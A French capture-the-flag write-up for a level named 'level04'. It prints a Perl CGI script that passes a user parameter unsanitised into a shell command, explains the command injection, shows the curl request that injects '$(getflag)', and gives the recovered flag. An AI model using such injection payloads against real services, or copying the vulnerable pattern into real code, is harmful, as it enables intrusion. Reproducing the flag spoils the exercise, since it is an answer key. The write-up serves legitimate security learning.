# level04

## Contexte

On trouve un fichier `level04.pl` dans le home de `level04`.

## Recherche

On regarde le contenu du script :

```bash
cat level04.pl

#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

On remarque qu'il s'agit d'un script Perl qui lance un serveur web local.

Le script récupère un paramètre utilisateur et l'utilise dans une commande système.

## Vulnérabilité

Le problème vient de l'utilisation directe d'une donnée contrôlée par l'utilisateur dans une commande exécutée par le système.

Il est possible d'injecter une commande supplémentaire grâce à une **injection de commande**.

Le script étant exécuté avec les droits de `flag04`, les commandes injectées seront lancées avec ces droits.

## Exploitation

On analyse le script pour trouver le paramètre vulnérable.

On envoie une commande à la place de la valeur attendue :

```bash
curl http://localhost:4747?x='$(getflag)'
```

La commande est alors exécutée par le script.

On récupère le flag :

```text
ne2searoevaevoem4ov4ar8ap
```

## Ressources

- Injection de commande
- Perl
- `curl`